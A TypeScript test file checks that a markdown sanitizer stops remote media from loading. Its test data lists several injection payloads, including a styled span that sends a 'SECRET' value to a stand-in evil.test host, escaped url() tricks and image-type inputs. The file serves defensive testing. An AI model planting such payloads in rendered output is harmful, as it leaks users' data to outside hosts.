import assert from 'node:assert/strict';
import { test } from 'node:test';
import { neutralizeRemoteMedia } from '../src/safeMarkdown';

// A real tag (not one escaped as text) with a loading attribute, a live <input>, or a remote image.
const loads = (out: string) =>
  /<[a-z][^<>]*\s(?:style|background|src|srcset|poster)\s*=/i.test(out) || /<input/i.test(out) || /!\[[^\]]*(?:\[[^\]]*\][^\]]*)*\]\(https?:/i.test(out);

// The cases from the 2026-09-15 review.
const unsafe = [
  '<span style=background:url(https://evil.test/?q=SECRET)>x</span>',
  '<span style="background:u\\72l(https://evil.test/esc)">x</span>',
  '![a [b] c](https://evil.test/nested.png)',
  '<input type="image" src="https://evil.test/input.png">',
  '<table background="https://evil.test/table.png"><tr><td>x</td></tr></table>',
  'Ref ![alt][r]\n\n[r]: https://evil.test/ref.png',
];

for (const input of unsafe) {
  test(`remote media no longer loads: ${input.slice(0, 50).replace(/\n/g, " ")}`, () => {
    assert.equal(loads(neutralizeRemoteMedia(input)), false, neutralizeRemoteMedia(input));
  });
}

test('a remote image becomes a link', () => {
  assert.equal(neutralizeRemoteMedia('![a [b] c](https://evil.test/nested.png)'), '[a [b] c](https://evil.test/nested.png)');
});

test('embeds, local images and code are left alone', () => {
  const text = 'Embed ![[Figure 1.png]], local ![fig](attachments/fig.png), code `![x](https://a.test/b.png)`';
  assert.equal(neutralizeRemoteMedia(text), text);
});
